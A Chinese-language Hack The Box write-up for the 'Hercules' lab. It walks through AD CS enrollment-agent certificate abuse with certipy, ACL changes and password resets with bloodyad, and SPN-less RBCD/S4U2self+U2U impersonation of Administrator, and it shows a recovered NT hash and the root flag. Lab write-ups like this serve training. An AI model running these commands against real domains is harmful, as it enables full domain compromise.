**向 CA-HERCULES 申请注册代理证书**

我们向 **CA-HERCULES** 申请了注册**代理**证书。该证书允许持有者为其他用户注册证书，从而在域内提供委托的证书颁发功能。

**Key Steps: 关键步骤：**

1. 使用 `fernando.r` 凭据进行身份验证。

2. 已向 **CA-HERCULES** 提交了注册代理权限的证书请求。

3. 获取并存储证书以供后续基于证书的作。

   

```shell
 ntpdate -u 10.129.242.196
export KRB5CCNAME=$(pwd)/fernando.r.ccache 
certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-host dc.hercules.htb -dc-ip 10.129.242.196 -target "dc.hercules.htb" -ca 'CA-HERCULES' -template "EnrollmentAgent" -application-policies "Certificate Request Agent"


-target "dc.hercules.htb"	目标 CA 服务器名称
-ca 'CA-HERCULES'	证书颁发机构（CA）的名称
-template "EnrollmentAgent"	要注册的证书模板名，该模板应为 注册代理 模板
-application-policies "Certificate Request Agent"	指定证书的增强密钥用法（EKU）为“证书请求代理”，使得此证书能代表其他用户请求证书
```

![image-20260728161802989](/images/htblabs/hercules/20260728161803148.png)

### **RBCD **

接下来用这个证书请求允许代表另一个用户的证书，最开始分析只有两个用户可以远程登陆，我们已经成功登录其中一个用户了，现在去请求另一个可以远程登陆的用户

我们通过 fernando.r 请求 ashley.g 的用户证书

```
certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-ip "10.129.242.196" -dc-host dc.hercules.htb -target "dc.hercules.htb" -ca 'CA-HERCULES' -template "User" -pfx fernando.r.pfx -on-behalf-of "hercules\ashley.b" -dcom
```

![image-20260728162523322](/images/htblabs/hercules/20260728162523486.png)

使用ashley.b.pfx来验证身份：

```
certipy-ad auth -pfx ashley.b.pfx -dc-ip 10.129.242.196
```

![image-20260728163118848](/images/htblabs/hercules/20260728163118974.png)

```shell
 Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2

```

横向到dc上

先请求ashley.b的票据：

```
impacket-getTGT -hashes :1e719fbfddd226da74f644eac9df7fd2 hercules.htb/ashley.b@dc.hercules.htb

```

![image-20260728163709129](/images/htblabs/hercules/20260728163709284.png)

```
 export KRB5CCNAME=$(pwd)/ashley.b@dc.hercules.htb.ccache 
```

```shell
python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass hercules.htb/ashley.b@dc.hercules.htb
```

![image-20260728164147343](/images/htblabs/hercules/20260728164147482.png)

桌面上找到一个aCleanup.ps1查看一下：

![image-20260728164757635](/images/htblabs/hercules/20260728164757784.png)

内容大概是让我们执行以一下这个脚本后面来重置密码：

还有个mail文件夹

![image-20260728184620786](/images/htblabs/hercules/20260728184620891.png)

```
**来自：** Ashley Browne  
**发送时间：** 星期一 09:49:37  
**收件人：** 域管理员 <Administrator@HERCULES.HTB>  
**主题：** 无法重置用户密码

早上好，

今天我的一个同事收到了用户的密码重置请求，但由于某种原因他们因权限无效而无法执行操作。我对照其他用户进行了核实，确认我们团队拥有对该用户所在部门进行密码更改的权限。我被告知联系你们以寻求进一步协助。

涉及的用户是“工程部”的“will.s”。

期待您的回复。

此致，Ashley。

---

**来自：** 域管理员  
**回复：** 无法重置用户密码

你好 Ashley，

你遇到的问题是因为部门中有些成员曾经属于敏感组，这阻止了你的权限。

我与安全团队详细讨论了你的问题，这里有一个我们认为既适合你们也适合我们的解决方案。我已将你们团队需要运行的脚本副本附在你的主文件夹中。为方便起见，我们在 IT 共享区提供了该脚本的快捷方式。你也可以从 PowerShell 手动运行该任务。

如有其他问题，请随时告诉我。

此致，域管理员。
```

文件中还提到了IT共享，查看一下

![image-20260728184933532](/images/htblabs/hercules/20260728184933644.png)

```shell
PS C:\Users\ashley.b> cd Scripts
PS C:\Users\ashley.b\Scripts> dir


    Directory: C:\Users\ashley.b\Scripts


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         12/4/2024  11:02 AM           1370 cleanup.ps1                                                           


PS C:\Users\ashley.b\Scripts> type cleanup.ps1
function CanPasswordChangeIn {
    param ($ace)
    if($ace.ActiveDirectoryRights -match "ExtendedRight|GenericAll"){
        return $true
    }
    return $false
}

function CanChangePassword {
    param ($target, $object)

    $acls = (Get-Acl -Path "AD:$target").Access
    foreach($ace in $acls){
        if(($ace.IdentityReference -eq $object) -and (CanPasswordChangeIn $ace)){
            return $true
        }
    }
    return $false
}

function CleanArtifacts {
    param($Object)

    Set-ADObject -Identity $Object -Clear "adminCount"
    $acl = Get-Acl -Path "AD:$Object"
    $acl.SetAccessRuleProtection($False, $False)
    Set-Acl -Path "AD:$Object" -AclObject $acl
}

$group = "HERCULES\IT Support"
$objects = (Get-ADObject -Filter * -SearchBase "OU=DCHERCULES,DC=HERCULES,DC=HTB").DistinguishedName
$Path = "C:\Users\ashley.b\Scripts\log.txt"
Set-Content -Path $Path -Value ""

foreach($object in $objects){
    if(CanChangePassword $object $group){
        $Members = (Get-ADObject -Filter * -SearchBase $object | Where-Object { $_.DistinguishedName -ne $object }).DistinguishedName

        foreach($DN in $Members){
            try {
                CleanArtifacts $DN
            } 
            catch {
                $_.Exception.Message | Out-File $Path -Append
            }
            "Cleanup : $DN" | Out-File $Path -Append
        }
    }
}
PS C:\Users\ashley.b\Scripts>

```

这个脚本遍历指定 OU 中 `IT Support` 组可重置密码的对象，并对其下所有子对象 清除 adminCount 属性并启用 ACL 继承，以清理高权限账户的残留痕迹，目前好像没什么可以继续利用的了。`iis_administrator`属于`SERVICE OPERATORS`组，而且这个组可以强制改`IIS_WEBSERVER$`用户的密码，同时注意到`IIS_WEBSERVER$`还是个机器账户

![image-20260728185444142](/images/htblabs/hercules/20260728185444246.png)





```shell
 export KRB5CCNAME=$(pwd)/Auditor.ccache
bloodyad --host dc.hercules.htb -d hercules.htb -u Auditor -k \
  get search --base "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" \
  --filter "(objectClass=user)" \
  --attr sAMAccountName,name,distinguishedName


```

![image-20260728183653989](/images/htblabs/hercules/20260728183654123.png)

发现有个`iis_administrator`用户，

### **重置`iis_administrator`的密码**

用`auditor`给`IT SUPPORT`一个`GenericAll`权限

```shell
bloodyad --host 'dc.hercules.htb' -d 'hercules.htb' -u 'auditor' -k add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT'

```

再给`auditor`一个`GenericAll`权限

```shell
bloodyad --host dc.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor

```

然后启用`iis_administrator`用户

```shell
bloodyad --host dc.hercules.htb -d 'hercules.htb' -u 'auditor'  -k remove uac 'iis_administrator' -f ACCOUNTDISABLE
                                                                                                        
```

![image-20260728202437694](/images/htblabs/hercules/20260728202437913.png)

改密码

```shell
bloodyad --host dc.hercules.htb -d hercules.htb -u Auditor -k set password 'iis_administrator' 'Aa123456!'

```

![image-20260728202601903](/images/htblabs/hercules/20260728202602011.png)

**下面就要改`IIS_WEBSERVER$`的密码了**

请求`iis_administrator`的`TGT`

```shell
impacket-getTGT 'hercules.htb'/'iis_administrator':'Aa123456!' -dc-ip 10.129.14.162

```

```shell
export KRB5CCNAME=$(pwd)/iis_administrator.ccache
bloodyad --host dc.hercules.htb -d hercules.htb  -u 'iis_administrator' -k set password 'iis_webserver$' 'Aa123456!'

```

![image-20260728202841978](/images/htblabs/hercules/20260728202842089.png)

###  RBCD+S4U2Self滥用

在`bloodhound`中发现`iis_webserver$`对`dc`有`AllowedToAct`

![image-20260728203035024](/images/htblabs/hercules/20260728203035140.png)

这个权限大概的意思是：IIS_WEBSERVER$ → 可以冒充任何人 → 访问 DC 的任何服务（cifs、ldap、host、rpcss…）

但是需要注意的是正常打的话，会产生一个报错

```
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)` `[-] Probably user IIS_WEBSERVER$ does not have constrained delegation permisions or impersonated user does not exist
```

原因是找不到spn，所以我们要找无SPN 的打法

计算机帐户 `**IIS_webserver$**` 具有委托给 `**dc.hercules.htb**` 的 **AllowedToAct** 条目，从而允许滥用 S4U2Self/S4U2Proxy（基于资源的受限委派）流。这允许计算机帐户获取服务票证，冒充任意用户到服务。

[（RBCD）基于资源的约束 |黑客配方](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd?utm_source=chatgpt.com#rbcd-on-spn-less-users)



```shell
                                                                                                                                                                                                                                      
┌──(venv)─(root㉿kali)-[~]
└─# impacket-getTGT -hashes :$(pypykatz crypto nt 'Aa123456!') 'hercules.htb/iis_webserver$'
Impacket v0.14.0.dev0+20260724.150409.df6a18ad - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in iis_webserver$.ccache
                                                                                                                                                                                                                                       
┌──(venv)─(root㉿kali)-[~]
└─# impacket-describeTicket 'iis_webserver$.ccache' | grep 'Ticket Session Key'
[*] Ticket Session Key            : e8c3dde20740552f93f504233e369aaa
                                                                           
```

```shell
export KRB5CCNAME=iis_webserver$.ccache
SPN 的 NT 哈希替换为 TGT 会话密钥
impacket-changepasswd -k -newhashes :e8c3dde20740552f93f504233e369aaa 'hercules.htb/iis_webserver$':'Aa123456!'@'dc.hercules.htb'
```

![image-20260728204031131](/images/htblabs/hercules/20260728204031252.png)

申请ST通过 S4U2self+U2U 执行 S4U2proxy 来获取委派服务票据

```shell
impacket-getST -u2u -impersonate "Administrator" -spn "host/dc.hercules.htb" -k -no-pass 'hercules.htb/iis_webserver$'

```

![image-20260728204142838](/images/htblabs/hercules/20260728204142976.png)

导入票据登录

```shell
export KRB5CCNAME=Administrator@host_dc.hercules.htb@HERCULES.HTB.ccache
python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb

```

![image-20260728204438351](/images/htblabs/hercules/20260728204438485.png)

```
 C:\Users\Admin\Desktop> dir


    Directory: C:\Users\Admin\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---         7/28/2026  10:01 PM             34 root.txt                                                              


tPS C:\Users\Admin\Desktop> type root.txt
8acbcb116e5e20a45e4436bc247532a6

```

